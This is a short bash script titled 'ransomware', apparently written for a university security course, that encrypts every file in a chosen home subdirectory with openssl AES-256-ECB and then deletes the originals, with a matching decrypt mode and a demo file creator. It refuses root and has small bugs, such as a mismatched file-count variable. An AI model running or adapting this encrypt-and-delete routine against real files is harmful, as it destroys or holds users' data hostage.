#!/bin/bash

#Exclude root/priviledged from executing:
if  [ $(id -u) = 0 ] || [ -w / ]; then
	echo "No root is allowed!"
	exit
fi

function usage(){
    printf "Usage: \n"
    printf "./ransomware -n <num_of_files> -d <directory>\n"
    printf "\tOR\n"
    printf "./ransomware -e -d <directory> -p <password>\n\n"
    printf "Options: \n"
    printf -- "-n,  --files     Creates <num_of_files> files in <directory>\n"
    printf -- "-e,  --encrypt   Encrypts everything in given <directory> using <password>\n"
    printf -- "-d,  --decrypt   Decrypts everything in given <directory> using <password>\n"
    printf -- "-h,  --help      This help message\n\n"
    printf -- "WARNING: This is a test tool, be careful though.\n"
    exit
}

function create_files(){
	## get in the directory:
	cd ~/"$dir"
	# creating demo files:
	while [[ "$filenum" -gt '0' ]]
	do
		touch "file$filenum.txt"	#file_1.txt, file_2.txt, etc..
		let "filenum=filenum-1"		#must move forward, or backward	
	done
	exit 
}

function encrypt(){
	#in case it breaks, exit: 
	shopt -s nullglob 
	#assign as array:
	files=(~/"$dir"/*)	
	#encrypt files:
	for file in "${files[@]}"
	do		
		 openssl enc -aes-256-ecb -pbkdf2 -in $file -out $file.encrypt -k $pass
		 rm -rf "$file"
	done
	exit
}

function decrypt(){
	#in case it breaks, exit: 
	shopt -s nullglob 
	#assign as array:
	files=(~/"$dir"/*)
    for file in "${files[@]}"
	do 	
    	if [[ "$file" == *".encrypt"* ]]
	then    			
    		#remove ".encrypt" suffix from the end and decrypt:
        	 openssl enc -d -aes-256-ecb -pbkdf2 -in $file -out  "${file%%.encrypt*}" -k $pass
        	rm -rf "$file"
    	fi     
    done
    exit 0
}


if [[ -z $1 ]]
then
	echo "Bad usage of script $0"
	exit
fi

export LD_PRELOAD=~/Desktop/Security_Systems/5th_assignment/logger.so 

#main:
while ! [[ -z $1 ]]
do
	if [[ $1 == '-h' ]]
	then
		usage
	elif [[ $1 == '-e' ]] && [[ $2 == '-d' ]] && [[ $4 == '-p' ]]
	then
		dir="$3"
		pass="$5"
		encrypt
	elif [[ $1 == '-d' ]] && [[ $2 == '-d' ]] && [[ $4 == '-p' ]]
	then
		dir="$3"
		pass="$5"
		decrypt
	elif [[ $1 == '-n' ]] && [[ $3 == '-d' ]]
	then
		dir=$4
		file_num=$2
		create_files
	else
		tput setaf 1;
		echo "Bad usage of script $0 ."
		tput sgr0; 
		usage 
		exit
	fi
	shift
done
